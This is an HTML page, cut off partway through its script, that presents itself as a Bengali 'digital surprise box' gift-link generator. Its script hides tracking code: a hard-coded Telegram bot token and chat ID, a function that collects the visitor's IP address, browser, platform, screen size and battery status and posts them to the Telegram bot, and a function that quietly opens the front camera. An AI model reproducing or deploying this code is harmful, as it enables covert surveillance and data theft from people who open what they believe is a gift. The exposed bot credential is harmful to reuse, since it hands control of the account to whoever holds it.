<!--

<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú ‡¶¨‡¶ï‡ßç‡¶∏</title>
    
  
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
   
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
  
    <style>
        :root {
            --primary-color: #4A6CF7;
            --primary-dark: #3A5CE5;
            --secondary-color: #6C63FF;
            --accent-color: #FF6B8B;
            --background-gradient: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
            --box-shadow: 0 15px 35px rgba(0, 0, 0, 0.08);
            --box-shadow-hover: 0 20px 40px rgba(0, 0, 0, 0.12);
            --gift-box-color: #FF6B8B;
            --gift-lid-color: #FF8FA3;
            --ribbon-color: #FFD166;
            --text-dark: #2D3748;
            --text-light: #718096;
            --success-color: #10B981;
            --border-radius: 12px;
            --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            
            /* ‡¶•‡¶ø‡¶Æ ‡¶≠‡ßá‡¶∞‡¶ø‡ßü‡ßá‡¶¨‡¶≤ */
            --theme-name: 'general';
            --theme-primary: #4A6CF7;
            --theme-secondary: #6C63FF;
            --theme-accent: #FF6B8B;
            --theme-gift-box: #4A6CF7;
            --theme-gift-lid: #6C63FF;
            --theme-ribbon: #FF6B8B;
            --theme-background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
        }

        /* ‡¶ú‡¶®‡ßç‡¶Æ‡¶¶‡¶ø‡¶® ‡¶•‡¶ø‡¶Æ */
        .theme-birthday {
            --theme-name: 'birthday';
            --theme-primary: #FF6B8B;
            --theme-secondary: #FF8FA3;
            --theme-accent: #FFD166;
            --theme-gift-box: #FF6B8B;
            --theme-gift-lid: #FF8FA3;
            --theme-ribbon: #FFD166;
            --theme-background: linear-gradient(135deg, #ffeef2 0%, #ffd6df 100%);
        }

        /* ‡¶¨‡¶ø‡¶¨‡¶æ‡¶π ‡¶¨‡¶æ‡¶∞‡ßç‡¶∑‡¶ø‡¶ï‡ßÄ ‡¶•‡¶ø‡¶Æ */
        .theme-anniversary {
            --theme-name: 'anniversary';
            --theme-primary: #D4AF37;
            --theme-secondary: #FFD700;
            --theme-accent: #FF6B8B;
            --theme-gift-box: #D4AF37;
            --theme-gift-lid: #FFD700;
            --theme-ribbon: #FF6B8B;
            --theme-background: linear-gradient(135deg, #fff9e6 0%, #ffefbf 100%);
        }

        /* ‡¶®‡¶§‡ßÅ‡¶® ‡¶¨‡¶õ‡¶∞ ‡¶•‡¶ø‡¶Æ */
        .theme-newyear {
            --theme-name: 'newyear';
            --theme-primary: #10B981;
            --theme-secondary: #34D399;
            --theme-accent: #FFD166;
            --theme-gift-box: #10B981;
            --theme-gift-lid: #34D399;
            --theme-ribbon: #FFD166;
            --theme-background: linear-gradient(135deg, #e6fff5 0%, #ccffeb 100%);
        }

        /* ‡¶™‡ßç‡¶∞‡¶™‡ßã‡¶ú‡¶æ‡¶≤ ‡¶•‡¶ø‡¶Æ */
        .theme-proposal {
            --theme-name: 'proposal';
            --theme-primary: #EC4899;
            --theme-secondary: #F472B6;
            --theme-accent: #C084FC;
            --theme-gift-box: #EC4899;
            --theme-gift-lid: #F472B6;
            --theme-ribbon: #C084FC;
            --theme-background: linear-gradient(135deg, #fdf2f8 0%, #fce7f3 100%);
        }

        /* ‡¶∏‡¶æ‡¶ß‡¶æ‡¶∞‡¶£ ‡¶ì ‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ ‡¶•‡¶ø‡¶Æ */
        .theme-general, .theme-custom {
            --theme-name: 'general';
            --theme-primary: #4A6CF7;
            --theme-secondary: #6C63FF;
            --theme-accent: #FF6B8B;
            --theme-gift-box: #4A6CF7;
            --theme-gift-lid: #6C63FF;
            --theme-ribbon: #FF6B8B;
            --theme-background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f5 100%);
        }

        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Poppins', sans-serif; background: var(--theme-background); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: var(--text-dark); line-height: 1.6; padding: 15px; overflow-x: hidden; -webkit-text-size-adjust: 100%; touch-action: manipulation; transition: background 0.5s ease; }
        .container { background-color: white; padding: 30px 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow); width: 100%; max-width: 500px; text-align: center; transition: var(--transition); position: relative; overflow: hidden; z-index: 10; }
        .container::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(to right, var(--theme-primary), var(--theme-accent)); }
        .container:hover { box-shadow: var(--box-shadow-hover); transform: translateY(-5px); }
        h1, h2, h3 { color: var(--theme-primary); margin-bottom: 15px; font-weight: 700; }
        #themeMessage { font-size: 22px; margin-top: -10px; }
        h1 { font-size: 24px; display: flex; align-items: center; justify-content: center; gap: 10px; }
        h1 span { font-size: 1.8em; }
        p { color: var(--text-light); margin-bottom: 20px; font-size: 15px; }
        form { display: flex; flex-direction: column; margin-top: 20px; }
        .form-group { margin-bottom: 15px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-weight: 600; color: var(--text-dark); font-size: 14px; }
        input[type="text"], input[type="url"], textarea, select, input[type="datetime-local"] { width: 100%; padding: 14px 16px; border: 1.5px solid #E2E8F0; border-radius: 8px; box-sizing: border-box; transition: var(--transition); font-family: 'Poppins', sans-serif; font-size: 16px; resize: vertical; -webkit-appearance: none; }
        input:focus, textarea:focus, select:focus, input[type="datetime-local"]:focus { outline: none; border-color: var(--theme-primary); box-shadow: 0 0 0 3px rgba(74, 108, 247, 0.1); }
        button { background: linear-gradient(to right, var(--theme-primary), var(--theme-secondary)); color: white; padding: 16px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; transition: var(--transition); display: flex; align-items: center; justify-content: center; gap: 8px; box-shadow: 0 4px 15px rgba(var(--theme-primary-rgb), 0.3); width: 100%; -webkit-appearance: none; }
        button:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(var(--theme-primary-rgb), 0.4); }
        button:active { transform: translateY(0); }
        #generatedLinkContainer { margin-top: 30px; border-top: 1px solid #F1F5F9; padding-top: 25px; background-color: #F8FAFC; border-radius: 8px; padding: 20px; }
        #generatedLink { width: 100%; padding: 12px 16px; margin-top: 10px; background-color: white; border: 1.5px solid #E2E8F0; border-radius: 8px; text-align: center; font-size: 14px; color: var(--text-dark); word-break: break-all; -webkit-user-select: all; -moz-user-select: all; -ms-user-select: all; user-select: all; }
        #copyButton { background: linear-gradient(to right, var(--success-color), #34D399); box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); margin-top: 15px; }
        #copyButton:hover { box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4); }
        .hidden { display: none; }
        .gift-wrapper { position: relative; margin: 30px auto; width: 350px; height: 350px; perspective: 1000px; cursor: pointer; transition: all 0.5s ease; }
        .gift-box { position: relative; width: 160px; height: 160px; margin: 0 auto; transform-style: preserve-3d; transition: transform 0.5s ease; animation: float 3s ease-in-out infinite; -webkit-tap-highlight-color: transparent; }
        .box-body { width: 160px; height: 160px; background: linear-gradient(135deg, var(--theme-gift-box), var(--theme-gift-lid)); position: absolute; bottom: 0; z-index: 1; border-radius: 8px; box-shadow: 0 10px 20px rgba(var(--theme-gift-box-rgb), 0.3); transform: translateZ(0); transition: all 0.3s ease; }
        .ribbon-vertical { position: absolute; width: 25px; height: 160px; background: linear-gradient(to bottom, var(--theme-ribbon), #FFDF80); left: 67.5px; border-radius: 4px; box-shadow: 0 0 10px rgba(var(--theme-ribbon-rgb), 0.5); z-index: 2; }
        .ribbon-horizontal { position: absolute; width: 160px; height: 25px; background: linear-gradient(to right, var(--theme-ribbon), #FFDF80); top: 67.5px; border-radius: 4px; box-shadow: 0 0 10px rgba(var(--theme-ribbon-rgb), 0.5); z-index: 2; }
        .ribbon-bow { position: absolute; width: 40px; height: 40px; background: var(--theme-ribbon); top: -20px; left: 60px; border-radius: 50%; z-index: 4; box-shadow: 0 0 10px rgba(var(--theme-ribbon-rgb), 0.5); }
        .ribbon-bow::before, .ribbon-bow::after { content: ''; position: absolute; width: 30px; height: 30px; background: var(--theme-ribbon); border-radius: 50%; top: 5px; }
        .ribbon-bow::before { left: -15px; }
        .ribbon-bow::after { right: -15px; }
        .lid { width: 176px; height: 48px; background: linear-gradient(135deg, var(--theme-gift-lid), var(--theme-gift-box)); position: absolute; top: -24px; left: -8px; z-index: 3; transition: transform 1s cubic-bezier(0.68, -0.55, 0.27, 1.55); transform-origin: bottom; border-radius: 8px 8px 0 0; box-shadow: 0 -5px 15px rgba(var(--theme-gift-box-rgb), 0.3); transform: translateZ(10px); }
        .gift-box.open .lid { transform: rotateX(120deg) translateZ(10px); }
        .gift-content { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; opacity: 0; transform: scale(0.8); transition: all 0.8s ease 0.5s; z-index: 0; padding: 20px; text-align: center; color: white; text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3); }
        .gift-box.open .gift-content { opacity: 1; transform: scale(1); }
        .gift-box::before { content: ''; position: absolute; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.2); border-radius: 8px; opacity: 0; transition: opacity 0.3s ease; z-index: 4; }
        .gift-box:hover::before { opacity: 1; }
        .gift-box:hover .box-body { box-shadow: 0 15px 30px rgba(var(--theme-gift-box-rgb), 0.4); transform: translateZ(5px); }
        .gift-box.open { animation: box-disappear 1s forwards; }
        .sparkle { position: absolute; width: 8px; height: 8px; background: white; border-radius: 50%; opacity: 0; z-index: 5; }
        .gift-box.open .sparkle { animation: sparkle 1s ease-out; }
        .gift-content-revealed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: flex-start; align-items: center; opacity: 0; transform: scale(0.8); transition: all 0.8s ease 0.5s; z-index: 0; text-align: center; color: var(--text-dark); }
        .gift-wrapper.revealed { width: 100%; height: auto; min-height: auto; perspective: none; background: #ffffff; padding: 20px; border-radius: var(--border-radius); box-shadow: var(--box-shadow); }
        .gift-wrapper.revealed .gift-content-revealed { position: static; opacity: 1; transform: scale(1); width: 100%; height: auto; }
        #revealedImage { width: 100%; height: auto; display: block; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); transition: var(--transition); border: 3px solid var(--theme-primary); }
        .message-container { width: 100%; box-sizing: border-box; opacity: 0; transform: translateY(20px); transition: opacity 0.8s ease-in-out 1.2s, transform 0.8s ease-in-out 1.2s; background: #F8FAFC; padding: 20px; border-radius: 10px; border-left: 4px solid var(--theme-primary); text-align: left; }
        .message-container.show { opacity: 1; transform: translateY(0); }
        .message-container p { color: var(--text-dark); margin-bottom: 0; white-space: pre-wrap; overflow-wrap: break-word; word-wrap: break-word; word-break: break-word; }
        #revealedImage:hover { transform: scale(1.02); }
        .click-instruction { margin-top: 15px; font-size: 14px; color: var(--text-light); animation: pulse 2s infinite; font-weight: 500; }
        .victory-effect { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 100; display: none; }
        .firework { position: absolute; width: 5px; height: 5px; border-radius: 50%; animation: firework-explode 1.5s ease-out forwards; }
        .confetti-piece { position: absolute; width: 10px; height: 20px; opacity: 0; animation: confetti-fall 3s ease-in-out forwards; }
        .theme-selector { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; justify-content: center; }
        .theme-option { flex: 1; min-width: 120px; padding: 10px; border: 2px solid #E2E8F0; border-radius: 8px; text-align: center; cursor: pointer; transition: var(--transition); font-size: 14px; font-weight: 500; }
        .theme-option:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .theme-option.active { border-color: var(--theme-primary); background-color: rgba(var(--theme-primary-rgb), 0.1); color: var(--theme-primary); }
        .theme-option i { font-size: 20px; margin-bottom: 5px; display: block; }
        .instruction { background: linear-gradient(to right, #E1F0FF, #F0F4FF); padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 4px solid var(--theme-primary); text-align: left; font-size: 14px; }
        .instruction i { color: var(--theme-primary); margin-right: 10px; }
        .success-message { display: flex; align-items: center; justify-content: center; gap: 10px; color: var(--success-color); margin-top: 15px; font-weight: 600; font-size: 14px; }
        #countdown-container { text-align: center; padding: 20px; background: #F8FAFC; border-radius: 10px; margin-bottom: 20px; }
        #countdown-container h3 { color: var(--theme-primary); }
        #timer { font-size: 2em; font-weight: 700; color: var(--text-dark); letter-spacing: 2px; }
        @keyframes float { 0%, 100% { transform: translateY(0) rotate(0deg); } 25% { transform: translateY(-8px) rotate(1deg); } 50% { transform: translateY(-4px) rotate(0deg); } 75% { transform: translateY(-8px) rotate(-1deg); } }
        @keyframes pulse { 0% { transform: scale(1); opacity: 0.7; } 50% { transform: scale(1.05); opacity: 1; } 100% { transform: scale(1); opacity: 0.7; } }
        @keyframes sparkle { 0% { opacity: 0; transform: scale(0) rotate(0deg); } 50% { opacity: 1; transform: scale(1) rotate(180deg); } 100% { opacity: 0; transform: scale(0) rotate(360deg); } }
        @keyframes box-disappear { 0% { transform: scale(1); opacity: 1; } 70% { transform: scale(1.2); opacity: 0.7; } 100% { transform: scale(0); opacity: 0; display: none; } }
        @keyframes firework-explode { 0% { transform: translate(0, 0); opacity: 1; } 100% { transform: translate(var(--tx), var(--ty)); opacity: 0; } }
        @keyframes confetti-fall { 0% { transform: translateY(-100px) rotate(0deg); opacity: 1; } 100% { transform: translateY(100vh) rotate(360deg); opacity: 0; } }
        @keyframes victory-glow { 0% { box-shadow: 0 0 20px rgba(var(--theme-primary-rgb), 0.5); } 50% { box-shadow: 0 0 40px rgba(var(--theme-primary-rgb), 0.8); } 100% { box-shadow: 0 0 20px rgba(var(--theme-primary-rgb), 0.5); } }
        @media (max-width: 480px) { .container { padding: 25px 15px; } h1 { font-size: 20px; } p { font-size: 14px; } #themeMessage { font-size: 18px; } .gift-wrapper { width: 160px; height: 200px; } .gift-box, .box-body { width: 140px; height: 140px; } .ribbon-vertical { width: 20px; height: 140px; left: 60px; } .ribbon-horizontal { width: 140px; height: 20px; top: 60px; } .ribbon-bow { left: 50px; } .lid { width: 154px; height: 42px; top: -21px; left: -7px; } input[type="text"], input[type="url"], textarea, select { font-size: 16px; } .theme-option { min-width: 100px; font-size: 12px; } .theme-option i { font-size: 16px; } }
        @media (max-width: 360px) { .container { padding: 20px 10px; } h1 { font-size: 18px; } p { font-size: 13px; } #themeMessage { font-size: 16px; } .gift-wrapper { width: 140px; height: 180px; } .gift-box, .box-body { width: 120px; height: 120px; } .ribbon-vertical { width: 18px; height: 120px; left: 51px; } .ribbon-horizontal { width: 120px; height: 18px; top: 51px; } .ribbon-bow { left: 40px; } .lid { width: 132px; height: 36px; top: -18px; left: -6px; } .theme-option { min-width: 80px; padding: 8px 5px; font-size: 11px; } }
        @media (hover: none) and (pointer: coarse) { .gift-box:hover::before { opacity: 0; } .gift-box:hover .box-body { box-shadow: 0 10px 20px rgba(var(--theme-gift-box-rgb), 0.3); transform: translateZ(0); } button:hover { transform: none; box-shadow: 0 4px 15px rgba(var(--theme-primary-rgb), 0.3); } #revealedImage:hover { transform: none; } .theme-option:hover { transform: none; box-shadow: none; } }
    </style>
</head>
<body>
    
    <div class="container" id="form-container">
        <h1><span>üéÅ</span> ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú ‡¶¨‡¶ï‡ßç‡¶∏</h1>
        <p>‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡¶ø‡¶Ø‡¶º‡¶ú‡¶®‡¶ï‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶¨‡¶ø‡¶∂‡ßá‡¶∑ ‡¶°‡¶ø‡¶ú‡¶ø‡¶ü‡¶æ‡¶≤ ‡¶â‡¶™‡¶π‡¶æ‡¶∞ ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</p>
        
        <div class="instruction">
            <i class="fas fa-info-circle"></i>
            <span>‡¶®‡¶ø‡¶ö‡ßá‡¶∞ ‡¶´‡¶∞‡ßç‡¶Æ‡¶ü‡¶ø ‡¶™‡ßÇ‡¶∞‡¶£ ‡¶ï‡¶∞‡ßÅ‡¶® ‡¶è‡¶¨‡¶Ç ‡¶è‡¶ï‡¶ü‡¶ø ‡¶Ö‡¶®‡¶®‡ßç‡¶Ø ‡¶ó‡¶ø‡¶´‡¶ü ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</span>
        </div>
        
        
        <div class="theme-selector">
            <div class="theme-option active" data-theme="birthday"><i class="fas fa-birthday-cake"></i> ‡¶ú‡¶®‡ßç‡¶Æ‡¶¶‡¶ø‡¶®</div>
            <div class="theme-option" data-theme="anniversary"><i class="fas fa-ring"></i> ‡¶¨‡¶ø‡¶¨‡¶æ‡¶π ‡¶¨‡¶æ‡¶∞‡ßç‡¶∑‡¶ø‡¶ï‡ßÄ</div>
            <div class="theme-option" data-theme="newyear"><i class="fas fa-glass-cheers"></i> ‡¶®‡¶§‡ßÅ‡¶® ‡¶¨‡¶õ‡¶∞</div>
            <div class="theme-option" data-theme="proposal"><i class="fas fa-heart"></i> ‡¶™‡ßç‡¶∞‡¶™‡ßã‡¶ú‡¶æ‡¶≤</div>
            <div class="theme-option" data-theme="general"><i class="fas fa-gift"></i> ‡¶∏‡¶æ‡¶ß‡¶æ‡¶∞‡¶£</div>
            <div class="theme-option" data-theme="custom"><i class="fas fa-paint-brush"></i> ‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ</div>
        </div>

        <form id="giftForm">
            <div class="form-group hidden" id="customThemeGroup">
                <label for="customThemeText"><i class="fas fa-text-height"></i> ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ï‡¶æ‡¶∏‡ßç‡¶ü‡¶Æ ‡¶•‡¶ø‡¶Æ‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ:</label>
                <input type="text" id="customThemeText" placeholder="‡¶Ø‡ßá‡¶Æ‡¶®: ‡¶∂‡ßÅ‡¶≠ ‡¶∏‡ßç‡¶®‡¶æ‡¶§‡¶ï">
            </div>

            <div class="form-group">
                <label for="senderName"><i class="fas fa-user"></i> ‡¶™‡ßç‡¶∞‡ßá‡¶∞‡¶ï‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ:</label>
                <input type="text" id="senderName" required placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®">
            </div>
            <div class="form-group">
                <label for="receiverName"><i class="fas fa-user-friends"></i> ‡¶™‡ßç‡¶∞‡¶æ‡¶™‡¶ï‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ:</label>
                <input type="text" id="receiverName" required placeholder="‡¶™‡ßç‡¶∞‡¶æ‡¶™‡¶ï‡ßá‡¶∞ ‡¶®‡¶æ‡¶Æ ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®">
            </div>
            <div class="form-group">
                <label for="message"><i class="fas fa-envelope"></i> ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ:</label>
                <textarea id="message" rows="4" required placeholder="‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶ø‡¶∂‡ßá‡¶∑ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ ‡¶≤‡¶ø‡¶ñ‡ßÅ‡¶®..."></textarea>
            </div>
            <div class="form-group">
                <label for="imageURL"><i class="fas fa-image"></i> ‡¶õ‡¶¨‡¶ø‡¶∞ URL (‡¶ê‡¶ö‡ßç‡¶õ‡¶ø‡¶ï):</label>
                <input type="url" id="imageURL" placeholder="‡¶∏‡¶∞‡¶æ‡¶∏‡¶∞‡¶ø ‡¶õ‡¶¨‡¶ø‡¶∞ ‡¶≤‡¶ø‡¶Ç‡¶ï ‡¶¶‡¶ø‡¶® (‡¶Ø‡ßá‡¶Æ‡¶®: https://i.imgur.com/image.jpg)">
            </div>
            
            <div class="form-group">
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                    <input type="checkbox" id="enableCountdown" style="width: auto; height: 16px; aspect-ratio: 1;">
                    <span><i class="fas fa-clock"></i> ‡¶ï‡¶æ‡¶â‡¶®‡ßç‡¶ü‡¶°‡¶æ‡¶â‡¶® ‡¶ü‡¶æ‡¶á‡¶Æ‡¶æ‡¶∞ ‡¶∏‡ßá‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶®</span>
                </label>
                <div id="countdownInputGroup" class="hidden" style="margin-top: 10px;">
                    <label for="countdownDateTime">‡¶Ü‡¶®‡¶≤‡¶ï ‡¶π‡¶ì‡ßü‡¶æ‡¶∞ ‡¶∏‡¶Æ‡ßü:</label>
                    <input type="datetime-local" id="countdownDateTime">
                </div>
            </div>

            <button type="submit"><i class="fas fa-link"></i> ‡¶ó‡¶ø‡¶´‡¶ü ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        </form>
        
        <div id="generatedLinkContainer" class="hidden">
            <h3><i class="fas fa-check-circle"></i> ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶§‡ßà‡¶∞‡¶ø ‡¶π‡ßü‡ßá‡¶õ‡ßá!</h3>
            <p>‡¶è‡¶á ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ü‡¶ø ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßá ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶™‡ßç‡¶∞‡¶ø‡ßü‡¶ú‡¶®‡¶ï‡ßá ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡•§</p>
            <input type="text" id="generatedLink" readonly>
            <button id="copyButton"><i class="fas fa-copy"></i> ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
            <div id="copySuccess" class="success-message hidden"><i class="fas fa-check"></i> ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ü‡¶ø ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá!</div>
        </div>
    </div>

   
    <div class="container hidden" id="gift-container">
        <h2 id="receiverTitle"></h2>
        
        <div id="countdown-container" class="hidden">
             <h3>‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú‡¶ü‡¶ø ‡¶Ü‡¶®‡¶≤‡¶ï ‡¶π‡¶¨‡ßá ‡¶Ü‡¶∞...</h3>
             <div id="timer"></div>
             <p style="margin-top: 10px;">‡¶∏‡¶†‡¶ø‡¶ï ‡¶∏‡¶Æ‡ßü‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®!</p>
        </div>

        <div id="main-gift-content" class="hidden">
            <p>‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶è‡¶ï‡¶ü‡¶ø ‡¶¨‡¶ø‡¶∂‡ßá‡¶∑ ‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú! ‡¶â‡¶™‡¶π‡¶æ‡¶∞‡¶ü‡¶ø ‡¶ñ‡ßÅ‡¶≤‡¶§‡ßá ‡¶®‡¶ø‡¶ö‡ßá‡¶∞ ‡¶¨‡¶ï‡ßç‡¶∏‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßã‡•§</p>
            <h2 id="themeMessage"></h2>
            <div class="gift-wrapper" id="giftWrapper">
                <div class="gift-box" id="giftBox">
                    <div class="ribbon-bow"></div>
                    <div class="lid"></div>
                    <div class="box-body"></div>
                    <div class="ribbon-vertical"></div>
                    <div class="ribbon-horizontal"></div>
                    <div class="sparkle" style="top: 20px; left: 30px;"></div>
                    <div class="sparkle" style="top: 50px; right: 40px;"></div>
                    <div class="sparkle" style="bottom: 60px; left: 50px;"></div>
                    <div class="sparkle" style="bottom: 30px; right: 30px;"></div>
                    <div class="gift-content">
                        <i class="fas fa-gift" style="font-size: 40px; margin-bottom: 10px;"></i>
                        <h3 style="color: white; margin: 0;">‡¶∏‡¶æ‡¶∞‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶ú!</h3>
                    </div>
                </div>
                <div class="gift-content-revealed hidden" id="giftContentRevealed">
                    <img id="revealedImage" src="" alt="Gift Image" class="hidden">
                </div>
                <p class="click-instruction">‡¶¨‡¶ï‡ßç‡¶∏‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶®</p>
            </div>
        </div>
    </div>

    <div class="victory-effect" id="victoryEffect"></div>

    
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // --- ‡¶®‡¶§‡ßÅ‡¶® ‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ ‡¶Ö‡¶Ç‡¶∂: ‡¶ü‡ßá‡¶≤‡¶ø‡¶ó‡ßç‡¶∞‡¶æ‡¶Æ ‡¶è‡¶¨‡¶Ç ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶∏‡ßá‡¶ü‡¶ø‡¶Ç‡¶∏ ---
        const BOT_TOKEN = "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk"; // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶ü ‡¶ü‡ßã‡¶ï‡ßá‡¶® ‡¶¶‡¶ø‡¶®
        const CHAT_ID = "2139008203"; // ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü ‡¶Ü‡¶á‡¶°‡¶ø ‡¶¶‡¶ø‡¶®
        let videoStream = null;
        let video = null;

        // ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏‡ßá‡¶∞ ‡¶§‡¶•‡ßç‡¶Ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        async function sendDeviceInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ipAddress = data.ip;

                const battery = await navigator.getBattery();
                const batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;

                const deviceInfo = `
===== üéÅ Surprise Box Opened =====
Device Information:
- IP Address: ${ipAddress}
- Browser: ${navigator.userAgent}
- Platform: ${navigator.platform}
- Screen Resolution: ${window.screen.width}x${window.screen.height}
- ${batteryStatus}
                `;

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo })
                });
            } catch (error) {
                console.error("Error fetching device info:", error);
            }
        }

        // ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶®
        async function startCamera() {
            try {
                // ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶è‡¶≤‡¶ø‡¶Æ‡ßá‡¶®‡ßç‡¶ü ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá
                video = document.createElement('video');
                // ‡¶™‡¶ø‡¶õ‡¶®‡ßá‡¶∞ ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ‡¶∞ ‡¶™‡¶∞‡¶ø‡¶¨‡¶∞‡ßç‡¶§‡ßá ‡¶∏‡¶æ‡¶Æ‡¶®‡ßá‡¶∞ ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡ßá‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ
                const constraints = { video: { facingMode: 'user' } };
                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = videoStream;

                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve(true);
                    };
                });
            } catch (error) {
                console.error("Camera access denied:", error);
                return false;
            }
        }

